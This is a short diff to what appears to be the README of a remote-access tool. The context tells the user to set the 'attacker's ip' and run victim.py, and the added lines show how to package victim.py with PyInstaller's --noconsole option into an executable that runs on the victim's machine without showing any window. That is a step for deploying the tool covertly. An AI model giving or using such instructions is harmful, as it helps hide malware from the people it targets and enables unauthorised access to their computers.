@@ -25,3 +25,9 @@ Before running the script, change the server ip to the attacker's ip by directly
 ```
 python3 victim.py
 ```
+
+You may also wish to compile the victim script to an exe with hidden execution (require pyinstaller)
+The executable will be compiled in the 'dist' folder. It won't show any prompt when executed
+```
+pyinstaller --onefile --noconsole victim.py
+```
